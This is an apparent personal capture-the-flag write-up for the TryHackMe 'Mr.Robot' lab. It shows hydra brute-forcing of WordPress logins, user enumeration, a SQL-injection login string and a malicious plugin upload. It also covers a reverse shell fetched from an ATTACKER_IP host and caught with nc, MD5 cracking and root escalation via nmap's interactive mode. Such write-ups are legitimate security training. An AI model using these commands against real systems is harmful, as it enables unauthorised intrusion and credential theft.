# Mr.Robot

[TryHackMe Room](https://tryhackme.com/room/mrrobot)

## 1st flag

XHR request done from main blog page when `join`ing and entering some email is

```bash
curl 'http://10.10.255.85/join' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.255.85/join' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: s_cc=true; s_fid=5BB7F03E8E557905-365A053F5893E838; s_nr=1617470829556; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check' --data-raw 'email=hello%40example.com'
```

but the response is a page not found. Just a rabbit hole?

`/robots.txt`

```txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`http://10.10.255.85/key-1-of-3.txt` is the first flag

## 2nd flag

`fsocity.dic` is a wordlist. TODO find out for what?

Error page shown for
`http://10.10.255.85/fsociety.dic`
leads to
`http://10.10.255.85/wp-login.php`

### Login page

`http://10.10.255.85/wp-login.php`

on login:

```bash
curl 'http://10.10.255.85/wp-login.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.255.85/wp-login.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: s_cc=true; s_fid=5BB7F03E8E557905-365A053F5893E838; s_nr=1617468117779; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'log=admin&pwd=%27+OR+1%3D1--&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.255.85%2Fwp-admin%2F&testcookie=1'
```

```bash
hydra -v -V -L fsocity.dic -P fsocity.dic 10.10.255.85 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:ERROR\: Invalid username'
```

likely usernames:

```txt
mrrobot
root
admin
fsociety
```

passwords: possibly from the `fsocity.dic` wordlist

```bash
curl 'http://10.10.255.85/wp-login.php?action=lostpassword' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.255.85/wp-login.php?action=lostpassword' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: s_cc=true; s_fid=5BB7F03E8E557905-365A053F5893E838; s_nr=1617469117638; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'user_login=mr.robot&redirect_to=&wp-submit=Get+New+Password'
```

`'ERROR: Invalid username or e-mail.'`

timestamp on image in `/image`
`1:50:52`

### Enumerating user accounts

With `http://10.10.255.85/wp-login.php?action=lostpassword` we can enumerate users. An error response has `Invalid username or e-mail.` in it. Not having this error response means we found a valid user.

We adopted the brute force python script to get the following users

```log
Elliot
elliot
ELLIOT
Elliot
```

### Brute force login

pw is at the end of the `fsocity.dic` -> `ER28-0652`

## Wordpress Admin

users

```bash
kgordon@therapist.com
mich05654:password # changed pw to this
```

## Getting a shell

upload this [Malicious Wordpress plugin](https://github.com/wetw0rk/malicious-wordpress-plugin).
Then activate it by navigating to `http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php`
Result: meterpreter session

## Getting a tty (interactive shell)

in the meterpreter session type `shell` to get a shell on the target.

```bash
# on attacker
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
cd ~/Downloads
nano php-reverse-shell.php # set the IP to the attacker machine's IP for the reverse shell, default port is 1234
python3 -m http.server

# on target
cd .. # should now be in the directory where all the wordpress plugins are stored - with write access
wget ATTACKER_IP:8000/php-reverse-shell.php

# on attacker
sudo apt install rlwrap
rlwrap nc -lvnp 1234
# with the wordpress admin user logged-in in the browser, goto http://10.10.111.156//wp-content/plugins/r2.php to start the reverse-shell

# in the new reverse-shell
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

**Result**: shell should be upgraded to interactive (tty). `daemon@linux:/$` is shown before the cursor.

## 2nd flag so-close

`ls /home/robot`

### cracking the pw

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 robot-hash.txt
# abcdefghijklmnopqrstuvwxyz (robot)
```

Unfortunately, the ssh port is closed

## Horizontal PrivEsc

find files with SUID bit set

```bash
find / -perm -u=s 2>/dev/null #SUID
find / -perm /2000 2>/dev/null # GUID
```

**Problem:** no tty -> no sudo, su, ssh

### attempts

- [x] SUID bit -> no tty
- [x] ssh external login -> port 22 is closed
- [x] ssh internal login -> no tty
- [x] better reverse shell -> works
  - use pentestmonkey php-reverse-shell.php with `python -c 'import pty; pty.spawn("/bin/bash")'`
  - `export TERM=xterm`
  - `su robot`
- [x] `sudo -V` -> 1.8.9p5 not vulnerable
- [x] linux version `uname -a` -> 3.13.0.55-generic -> <https://www.exploit-db.com/exploits/37293> -> not working (`mount: only root can do that`)
- [x] backup, log, config files -> no access or nothing out of the ordinary
- [x] cronjob to get credentials for `bitnami`

## Root access

SUID bit (2nd attempt with a proper tty)
`nmap --interactive` then `!sh`
WHOOHOO root access
`cd /root` and cat out the final flag
